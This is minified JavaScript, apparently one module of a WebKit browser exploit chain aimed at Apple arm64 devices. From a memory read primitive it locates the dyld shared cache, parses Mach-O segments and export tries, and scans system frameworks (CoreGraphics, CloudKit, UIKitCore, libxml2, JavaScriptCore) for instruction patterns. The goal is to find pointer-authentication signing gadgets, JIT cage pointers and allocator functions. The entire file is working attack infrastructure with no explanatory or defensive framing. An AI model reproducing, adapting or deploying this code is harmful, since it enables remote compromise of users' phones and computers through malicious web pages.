let r = {};
globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
const P = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
  {
    N: G,
    tn: W,
    nn: C,
    Vt: m,
    U: j,
    An: S,
    vn: O,
    T: l,
    v: o,
    I: u,
    B: s,
    K: R,
    O: K
  } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
class nt {
  constructor(r, n) {
    this.Qo = r, this.images = n, this.rl = new or(), this.nl = new er();
  }
  tl(...r) {
    for (const n of r)
    for (const r of this.images)
    if (-1 !== r.path.indexOf(n)) return null === r.ol && (r.ol = rr.el(r.ll)), r.ol;
    throw new Error("-1 === r.path.indexOf(n)");
  }
  static il(r) {
    const n = P.platformState.exploitPrimitive,
      t = rr.il(r),
      o = (() => {
        const r = t.sl("__TEXT");
        if (null === r) throw new Error("null === r");
        return {
          Qo: t.al - r.cl,
          fl: t.al - r._l
        };
      })(),
      e = n.read32(o.fl + 0x1c0n),
      l = n.read32(o.fl + 0x1c4n),
      i = [],
      s = o.fl + j(e);
    for (let r = 0; r < l; r++) {
      const e = S(n.read64(s + j(32 * r))) + o.Qo,
        l = n.read32(s + j(32 * r) + 0x18n),
        a = n.readString(o.fl + j(l), 1024);
      i.push({
        path: a,
        ll: e,
        ol: t.al === e ? t : null
      });
    }
    return new nt(o.Qo, i);
  }
}
r.ul = async function () {
  const r = P.platformState.exploitPrimitive,
    n = new Intl.DateTimeFormat(),
    t = r.getObjectAddress(n),
    o = r.read64(t + 0x18n),
    e = S(r.read64(o)),
    l = S(r.read64(e)),
    i = nt.il(l);
  P.platformState.Dn = i;
};
class rr {
  static il(r) {
    const n = P.platformState.exploitPrimitive;
    let t = r - r % 0x1000n;
    for (;
    4277009103 !== n.read32(t);) t -= 0x1000n;
    return rr.el(t);
  }
  static el(r) {
    const n = P.platformState.exploitPrimitive,
      t = n.read32(r + j(16)),
      o = [];
    let e = null,
      l = null,
      i = 32;
    for (let s = 0; s < t; s += 1) {
      const t = n.read32(r + j(i)),
        s = n.read32(r + j(i) + j(4));
      switch (t) {
        case 25:{
            const t = Object.create({
              Xe: n.readString(r + j(i) + j(8), 16),
              cl: n.read64(r + j(i) + j(24)),
              ml: n.read64(r + j(i) + j(32)),
              _l: n.read64(r + j(i) + j(40)),
              dl: n.read64(r + j(i) + j(48)),
              hl: n.read32(r + j(i) + j(56)),
              wl: n.read32(r + j(i) + j(60)),
              flags: n.read32(r + j(i) + j(68)),
              bl: void 0,
              yl: (() => {
                const t = n.read32(r + j(i) + j(64)),
                  o = new Array(t).fill(null);
                for (const t in o) o[t] = {
                  name: n.readString(r + j(80 * t) + j(i + 72), 16),
                  cl: n.read64(r + j(80 * t) + j(i + 72) + 0x20n),
                  ml: n.read64(r + j(80 * t) + j(i + 72) + 0x28n),
                  _l: n.read64(r + j(80 * t) + j(i + 72) + 0x30n),
                  bl: void 0
                };
                return o;
              })(),
              xl(r) {
                for (const n of this.yl)
                if (n.name === r) return n;
                return null;
              }
            });
            if ("__TEXT" === t.Xe) {
              if (null !== l) throw new Error("null !== l");
              l = r - t.cl;
            }
            o.push(t);
            break;
          }
        case 2147483682:
        case 2147483699:
          if (null !== e) throw new Error("null !== e");
          e = {
            me: n.read32(r + j(i) + j(2147483682 === t ? 40 : 8)),
            size: n.read32(r + j(i) + j(2147483682 === t ? 44 : 12))
          };
      }
      i += s;
    }
    const s = {},
      a = [];
    if (null === l) throw new Error("null === l");
    for (const r of o) {
      r.bl = r.cl + l;
      for (const n of r.yl) n.bl = r.cl + l;
      r.Xe.length > 0 ? s[r.Xe] = r : a.push(r);
    }
    return new rr(r, s, a, e);
  }
  constructor(r, n, t, o) {
    const e = P.platformState.exploitPrimitive;
    this.al = r, this.Al = n, this.Sl = t, this.Cl = (() => {
      if (null === o) return null;
      const r = n.__LINKEDIT;
      if (void 0 === r) return null;
      const t = r.bl + j(o.me) - r._l,
        l = new Uint32Array(o.size + 3 >> 2);
      for (let r = 0; r < l.length; r++) l[r] = e.read32(t + j(4 * r));
      return new nr(l.buffer);
    })();
  }
  sl(r) {
    const n = this.Al[r];
    return void 0 !== n ? n : null;
  }
  kl(r) {
    if (null !== this.Cl) {
      const n = this.Cl.Nn(r);
      return null !== n ? this.al + j(n) : null;
    }
    throw new Error("null === this.Cl");
  }
}
class nr {
  Nn(r) {
    const n = new tr(this.Tl);
    let t = "",
      o = !1;
    for (; !o;) {
      o = !0;
      const e = n.El();
      if (0 !== e && r === t) {
        const r = n.El();
        if (8 !== r && 16 !== r) {
          return n.El();
        }
      }
      n.pl(e);
      const l = n.gl();
      for (let e = 0; e < l; e += 1) {
        const e = n.Il(0, 4132),
          l = n.El();
        if (e.length > 0 && r.startsWith(t + e)) {
          t += e, n.ue(l), o = !1;
          break;
        }
      }
    }
    return null;
  }
  constructor(r) {
    this.Tl = r;
  }
}
class tr {
  constructor(r) {
    this.Fl = new Uint8Array(r), this.en = new DataView(r), this.Pl = 0;
  }
  pl(r) {
    this.Pl += r;
  }
  ue(r) {
    this.Pl = r;
  }
  gl() {
    const r = this.Fl[this.Pl];
    return this.Pl += 1, r;
  }
  Il(r, n = 256) {
    let t = "";
    for (let o = 0; o < n; o++) {
      const n = this.gl();
      if (n === r) return t;
      t += String.fromCharCode(n);
    }
    throw new Error("n === r not found");
  }
  El() {
    let r = 0,
      n = 0;
    for (let t = 0; t < (128); t += 1) {
      const t = this.gl();
      if (r += (0x7f & t) << n, n += 7, 0 == (0x80 & t)) return r;
    }
    throw new Error("r += (0x7f & t) << n, n += 7, 0 == (0x80 & t) not found");
  }
}
class or {
  constructor() {}
  Ul(r) {
    const n = P.platformState.exploitPrimitive,
      t = r.vl.kl(r.Dl);
    if (null !== t)
    for (const o of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const e = r.Ll.sl(o);
      if (null !== e)
      for (let r = 0x0n; r < e.ml; r += 0x8n) {
        const o = n.read64(e.bl + r);
        if (S(o) === t) return o;
      }
    }
    return null;
  }
  Bl(r) {
    const n = P.platformState.exploitPrimitive,
      t = r.ol.sl("__TEXT");
    if (null === t) return null;
    const o = r.Ol;
    for (const e of ["__AUTH", "__AUTH_CONST", "__DATA", "__DATA_DIRTY"]) {
      const l = r.ol.sl(e);
      if (null !== l)
      for (let r = 0x0n; r < l.ml; r += 0x8n) {
        const e = n.read64(l.bl + r),
          i = S(e);
        if (t.bl <= i && i <= t.bl + t.ml && this.Nl(i, o)) return e;
      }
    }
    return null;
  }
  Kl(r, n, t = null) {
    P.platformState.exploitPrimitive;
    const o = r.sl("__TEXT");
    if (null === o) return null;
    const e = o.bl;
    let l = null !== t ? t - o.bl : 0x0n;
    for (; l < o.ml;) {
      const r = e + l;
      if (this.Nl(r, n, !1)) return r;
      l += 0x4n;
    }
    return null;
  }
  zl(r, n = 64) {
    const t = P.platformState.exploitPrimitive,
      o = r,
      e = [];
    let l = 0x0n;
    for (; l < j(n);) {
      const r = o + l,
        n = t.read32(r);
      if (0x14000000n === (0xfc000000n & j(n)) || 0x94000000n === (0xfc000000n & j(n))) {
        const t = 4 * this.Hl(n);
        e.push(r + j(t));
      }
      l += 0x4n;
    }
    return e;
  }
  Rl(r, n, t = 64) {
    P.platformState.exploitPrimitive;
    const o = r;
    let e = 0x0n;
    for (; e < j(t);) {
      const r = o + e;
      if (this.Nl(r, n, !1)) return r;
      e += 0x4n;
    }
    return null;
  }
  Hl(r) {
    return r << 6 >> 6;
  }
  Nl(r, n, t = !0) {
    const o = P.platformState.exploitPrimitive;
    let e = 0;
    const l = [];
    for (const r of n) 0x90000000n === (0x9f000000n & j(r)) ? (l.push(0x9f00001fn), e += 1) : e > 0 && 0xf9400000n === (0xffc00000n & j(r)) ? l.push(0xffc003ffn) : 0x14000000n === (0xfc000000n & j(r)) || 0x94000000n === (0xfc000000n & j(r)) ? l.push(0xfc000000n) : l.push(0xffffffffn);
    l.length !== n.length && W();
    let i = r;
    for (const r in n) {
      const e = o.read32(i);
      if ((j(n[r]) & j(l[r])) != (j(e) & j(l[r]))) return !1;
      if (!0 === t && 0x14000000n === (0xfc000000n & j(e))) {
        const r = 4 * this.Hl(e);
        i += j(r);
      } else i += 0x4n;
    }
    return !0;
  }
  Ml(r, n = 768, t = null) {
    const o = P.platformState.exploitPrimitive,
      e = [],
      l = new Array(32).fill(null);
    let i = !1;
    for (let s = 0; s < n; s += 4) {
      const n = r + j(s),
        a = j(o.read32(n));
      if (null !== t && a === t) {
        i = !0;
        break;
      }
      if (0xd65f0fffn === a || 0xd65f03c0n === a) {
        i = !0;
        break;
      }
      if (0x90000000n === (0x9f000000n & a)) {
        const r = a << 8n >> 13n,
          t = a >> 29n & 3n,
          o = 0x1fn & a,
          e = BigInt.asIntN(32, (r << 2n | t) << 12n);
        l[o] = n - n % 0x1000n + e;
      } else if (0xf9400000n === (0xffc00000n & a)) {
        const r = a >> 5n & 0x1fn,
          n = a >> 10n & 0xfffn,
          t = l[r];
        null !== t && (e.push(t + 0x8n * n), l[r] = null);
      }
    }
    if (!i) throw new Error("!i");
    return e;
  }
  Jl(r, n, t) {
    P.platformState.Dn;
    const o = P.platformState.exploitPrimitive,
      e = n.sl("__DATA_CONST");
    if (null === e) throw new Error("null === e");
    let l = r;
    const i = o.read32(r);
    if (0x14000000n !== (0xfc000000n & j(i))) return !1;
    const s = 4 * this.Hl(i);
    l += j(s);
    try {
      const r = this.Ml(l, 768, 0xd4200020n);
      if (2 != r.length) return !1;
      const n = r[0];
      if (!(e.bl < n && n < e.bl + e.ml)) return !1;
      const i = o.read64(n);
      return o.readString(i, t.length + 48) === t;
    } catch (r) {
      return !1;
    }
  }
  Gl(r, n, t) {
    const o = P.platformState.Dn,
      e = P.platformState.exploitPrimitive,
      l = o.tl(r),
      i = o.tl(n),
      s = i.sl("__TEXT");
    for (const r of ["__AUTH_CONST", "__DATA_CONST", "__AUTH"]) {
      const n = l.sl(r);
      if (null !== n)
      for (let r = 0x0n; r < n.ml; r += 0x8n) {
        const o = e.read64(n.bl + r),
          l = S(o);
        if (s.bl <= l && l <= s.bl + s.ml && l % 0x4n === 0x0n && this.Jl(l, i, t)) return o;
      }
    }
    throw new Error("Gl(r, n, t) failed");
  }
}
class er {
  constructor() {
    return this.jl = er.Xl(), this.Vl = {}, new Proxy(this, {
      get: (r, n) => (n in this.Vl || (this.Vl[n] = this.jl[n]()), this.Vl[n])
    });
  }
  static Xl() {
    return {
      Zl() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Ul({
          Dl: "_xmlSAX2GetPublicId",
          vl: r.tl("libxml2.2.dylib"),
          Ll: r.tl("libxml2.2.dylib")
        });
      },
      ql() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "enet_allocate_packet_payload_default",
          Ol: [3573752703, 2847821812, 2835446781, 2432713725, 2852127731, 2953777224, 4181814536, 2852193248, 3594455327, 2852127732, 3036676224, 2953777224, 4181816584, 3594455327, 4177529460, 2839641085, 2831306740, 3596554239],
          ol: r.tl("/System/Library/PrivateFrameworks/RESync.framework/RESync", "/System/Library/PrivateFrameworks/RESync.framework/Versions/A/RESync")
        });
      },
      Yl() {
        const r = P.platformState.Dn,
          n = (P.platformState.exploitPrimitive, r.rl.Ml(S(r.nl.ql), 560));
        if (2 !== n.length) throw new Error("2 !== n.length");
        return n[0];
      },
      Wl() {
        const r = P.platformState.Dn,
          n = (P.platformState.exploitPrimitive, r.rl.Ml(S(r.nl.ql), 560));
        if (2 !== n.length) throw new Error("2 !== n.length");
        return n[1];
      },
      $l() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "_HTTPConnectionFinalize",
          Ol: [3573752703, 2847821812, 2835446781, 2432713725, 2852127731, 4181729288, 3019899016, 4181726817, 2853372896, 3594455327],
          ol: r.tl("/System/Library/PrivateFrameworks/CoreUtils.framework/CoreUtils")
        });
      },
      Ql() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "_autohinter_iterator_begin",
          Ol: [3019899074, 4181723203, 3019899011, 4181722176, 4181727298, 3592358015, 3596551104],
          ol: r.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
        });
      },
      ra() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "_autohinter_iterator_end",
          Ol: [3019899073, 4181725218, 3019899010, 4181722144, 4181727265, 3592357983, 3596551104],
          ol: r.tl("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
        });
      },
      na() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.tl("libxml2.2.dylib").kl("_xmlHashScanFull");
      },
      ta() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Kl(r.tl("/System/Library/Frameworks/CloudKit.framework/CloudKit"), [3573752703, 2847694840, 2835437558, 2835501044, 2835577853, 2432746493, 2852324339, 2852258804, 2852127733, 1384120855, 1384120832, 1386079969, 1923956161, 2500362746, 2852127734, 2853503968, 2853569506, 2483610898, 4177527447, 2955245744, 4182113808, 3670090736, 4177527408, 2853569504, 2839772157, 2839695348, 2839631862, 2831441912, 3596554239]);
      },
      oa() {
        const r = P.platformState.Dn,
          n = (P.platformState.exploitPrimitive, r.nl.ta),
          t = r.rl.Ml(S(n), 116);
        if (1 !== t.length) throw new Error("1 !== t.length");
        return t[0];
      },
      ea() {
        const r = P.platformState.Dn,
          n = P.platformState.exploitPrimitive,
          t = r.tl("/usr/lib/libobjc.A.dylib"),
          o = r.tl("/System/Library/Frameworks/CloudKit.framework/CloudKit"),
          e = t.sl("__OBJC_RO");
        if (null === e) throw new Error("null === e");
        const l = o.sl("__DATA_CONST");
        if (null === l) throw new Error("null === l");
        const i = "cksqlcs_blobBindingValue:destructor:error:",
          s = l.bl + l.ml;
        for (let r = l.bl; r < s; r += 0x8n) {
          const t = n.read64(r);
          if (t >= e.bl && t < e.bl + e.ml && n.readString(t, i.length) === i) return t;
        }
        throw new Error("ea() failed");
      },
      la() {
        const r = P.platformState.Dn,
          n = P.platformState.exploitPrimitive,
          t = r.tl("/usr/lib/libobjc.A.dylib"),
          o = r.tl("/System/Library/Frameworks/CloudKit.framework/CloudKit"),
          e = t.sl("__OBJC_RO");
        if (null === e) throw new Error("null === e");
        const l = o.sl("__DATA_CONST");
        if (null === l) throw new Error("null === l");
        const i = "UUID",
          s = l.bl + l.ml;
        for (let r = l.bl; r < s; r += 0x8n) {
          const t = n.read64(r);
          if (t >= e.bl && t < e.bl + e.ml && n.readString(t, i.length + 48) === i) return t;
        }
        throw new Error("la() failed");
      },
      ia() {
        const r = P.platformState.Dn,
          n = P.platformState.exploitPrimitive,
          t = r.tl("/usr/lib/libobjc.A.dylib"),
          o = r.tl("/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore"),
          e = t.sl("__OBJC_RO");
        if (null === e) throw new Error("null === e");
        const l = o.sl("__DATA_CONST");
        if (null === l) throw new Error("null === l");
        const i = "secondAttribute",
          s = l.bl + l.ml;
        for (let r = l.bl; r < s; r += 0x8n) {
          const t = n.read64(r);
          if (t >= e.bl && t < e.bl + e.ml && n.readString(t, i.length + 48) === i) return r;
        }
        throw new Error("ia() failed");
      },
      sa() {
        P.platformState.Dn, P.platformState.exploitPrimitive;
        return P.platformState.Dn.rl.Gl("/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore", "/System/Library/PrivateFrameworks/UIKitCore.framework/UIKitCore", "secondAttribute");
      },
      aa() {
        const r = P.platformState.Dn,
          n = (P.platformState.exploitPrimitive, r.tl("/System/Library/Frameworks/Foundation.framework/Foundation").kl("_OBJC_CLASS_$_NSUUID"));
        if (null === n) throw new Error("null === n");
        return n;
      },
      ca() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "_EdgeInfoCFArrayReleaseCallBack",
          Ol: [3573752703, 2847821812, 2835446781, 2432713725, 2852193267, 2852127732, 4181722153, 4181723432, 3019899016, 4181721376, 4181721697, 3594455327, 2853438432, 2853372897, 2839641085, 2831306740, 3573752831, 3390965712, 3069182032, 3560476192, 335894792],
          ol: r.tl("/System/Library/Frameworks/CoreMedia.framework/CoreMedia")
        });
      },
      fa() {
        const r = P.platformState.Dn,
          n = P.platformState.exploitPrimitive,
          [t, o] = (() => {
            const t = r.tl("libdyld.dylib").sl("__DATA_DIRTY");
            if (null === t) return null;
            const o = t.xl("__dyld4");
            if (null === o) return null;
            const e = n.read64(o.bl + 8n),
              l = n.read64(S(e)),
              i = n.read64(S(l));
            return [e, rr.il(S(i))];
          })();
        if (null === o) throw new Error("null === o");
        return o;
      },
      _a() {
        const r = P.platformState.Dn,
          n = (P.platformState.exploitPrimitive, r.nl.fa),
          t = (() => {
            const t = [null],
              o = [3573752703, 2847898621, 2432697341, 4181721097, 3069706633, 3547382056, 3546332451, 3547449636, 2852258784, 2852652002, 2831252477, 3573752831, 3390965712, 3069182032, 3560476192];
            let e;
            for (e = [2852127729, 2852652016, 3573752095, 335544332, 2852127729, 2852652016, 3670084113, 335544328, 2852127729, 2852652016, 3573752159, 335544324, 2852127729, 2852652016, 3670085137, 2853241824, 3596551104]; t.length > 0;) {
              const l = r.rl.Kl(n, o, t.pop());
              if (null === l) continue;
              t.push(l + 0x4n);
              const i = r.rl.zl(l, 4 * o.length + 12);
              for (const r in i)
              if (2 !== i.length) continue;
              if (null !== r.rl.Rl(i[0], e, 256)) return l;
            }
            return null;
          })();
        if (null === t) throw new Error("null === t");
        const {
          ua: o,
          ma: e
        } = (() => {
          let o, e;
          e = 0x10n, o = [2852127729, 2852652016, 3573752095, 335544332, 2852127729, 2852652016, 3670084113, 335544328, 2852127729, 2852652016, 3573752159, 335544324, 2852127729, 2852652016, 3670085137, 2853241824, 3596551104];
          let l = null;
          for (;;) {
            if (i = l, l = r.rl.Kl(n, o, i), null === l) return null;
            if (l !== t) break;
            l += j(0x4n * o.length);
          }
          var i;
          if (null === l) return null;
          return {
            ua: l - 0x40n,
            ma: {
              pacda: l,
              autia: l + 1n * e,
              pacia: l + 2n * e,
              autda: l + 3n * e
            }
          };
        })();
        if (null === o) throw new Error("null === o");
        if (null === e.pacda) throw new Error("null === e.pacda");
        if (null === e.ha) throw new Error("null === e.ha");
        if (null === e.pacia) throw new Error("null === e.pacia");
        if (null === e.autda) throw new Error("null === e.autda");
        return o;
      },
      ba() {
        const r = P.platformState.Dn;
        P.platformState.exploitPrimitive;
        return r.rl.Bl({
          Dl: "_dlfcn_globallookup",
          Ol: [3573752703, 2847821812, 2835446781, 2432713725, 2852127731, 3531603968, 1384120353, 2483792040, 3019899136, 2852127732, 2853372897, 2487440593, 2852127731, 2853438432, 2483792025, 2853372896, 2839641085, 2831306740, 3596554239],
          ol: r.tl("/System/Library/PrivateFrameworks/ActionKit.framework/ActionKit")
        });
      },
      ya() {
        const r = P.platformState.Dn.tl("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
        if (null === r) throw new Error("null === r");
        return r;
      },
      xa: () => P.platformState.Dn.nl.ya.kl("_jitCagePtr"),
      Aa() {
        const r = P.platformState.exploitPrimitive,
          n = P.platformState.Dn.tl("/usr/lib/libxml2.2.dylib").kl("_xmlMalloc");
        return r.read64(n);
      },
      Sa: () => P.platformState.Dn.nl.ya.kl("__ZN3JSC10LinkBuffer8linkCodeERNS_14MacroAssemblerENS_20JITCompilationEffortE"),
      Ca: () => P.platformState.Dn.tl("/usr/lib/system/libsystem_platform.dylib").kl("__platform_memset"),
      ka: () => P.platformState.Dn.tl("/usr/lib/system/libsystem_platform.dylib").kl("__platform_memmove"),
      Ta: () => P.platformState.Dn.tl("/usr/lib/system/libsystem_malloc.dylib").kl("_malloc"),
      Ea: () => P.platformState.Dn.tl("/usr/lib/system/libsystem_malloc.dylib").kl("_free"),
      pa: () => P.platformState.Dn.nl.ya.kl("__ZN3WTF10fastMallocEm")
    };
  }
}
return r;